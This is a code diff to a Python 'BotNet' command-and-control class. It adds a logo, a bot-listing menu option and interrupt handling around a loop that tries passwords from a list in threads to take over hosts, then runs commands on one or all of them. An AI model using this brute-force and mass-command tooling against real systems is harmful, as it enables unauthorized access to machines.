@@ -3,6 +3,7 @@ from threading import Thread
 from typing import Optional
 from termcolor import colored
 from src.entities.Bot import Bot
+from src.constants.logo import ascii_logo
 
 
 class BotNet:
@@ -16,7 +17,7 @@ class BotNet:
         if not self.host or not self.user or not self.pwd_src_path:
             self.__get_args()
 
-        self.__run()
+        print(colored(ascii_logo, 'cyan'))
 
 
     def __get_args(self):
@@ -51,6 +52,7 @@ class BotNet:
 
 
     def disconnect_all(self):
+        print(colored('\nDisconnecting all bots...', 'yellow'))
         for bot in self.__bots:
             try:
                 bot.disconnect()
@@ -79,7 +81,8 @@ class BotNet:
             print(colored('Choose an option:', 'yellow'))
             print(colored('1. Select a specific bot', 'yellow'))
             print(colored('2. Run command on all bots', 'yellow'))
-            print(colored('3. Exit', 'yellow'))
+            print(colored('3. List all bots', 'yellow'))
+            print(colored('9. Exit', 'yellow'))
             print('\n')
 
             option = input('> ')
@@ -110,21 +113,31 @@ class BotNet:
                     print(f'[{bot.id}][{bot.name}]: {result}')
 
             elif option == '3':
+                for bot in self.__bots:
+                    print(f'[{bot.id}][{bot.name}]')
+                print('\n')
+                input(colored('Press enter to return to the menu...', 'yellow'))
+
+            elif option == '9':
                 print(colored('Exiting...', 'yellow'))
                 self.disconnect_all()
                 exit(0)
 
             else:
-                print(colored('Invalid option. Please enter 1, 2, or "m" to return to the menu.', 'red'))
+                print(colored('Invalid option.', 'red'))
 
 
-    def __run(self):
-        threads = []
-        for password in self.__get_passwords():
-            thread = Thread(target=self.__set_bots, args=(password,))
-            thread.start()
-            threads.append(thread)
-        [t.join() for t in threads]
+    def run(self):
+        print(colored('Connecting to bots...', 'yellow'))
+        try:
+            threads = []
+            for password in self.__get_passwords():
+                thread = Thread(target=self.__set_bots, args=(password,))
+                thread.start()
+                threads.append(thread)
+            [t.join() for t in threads]
 
-        while True:
-            self.__execute_command()
+            while True:
+                self.__execute_command()
+        except KeyboardInterrupt:
+            self.disconnect_all()
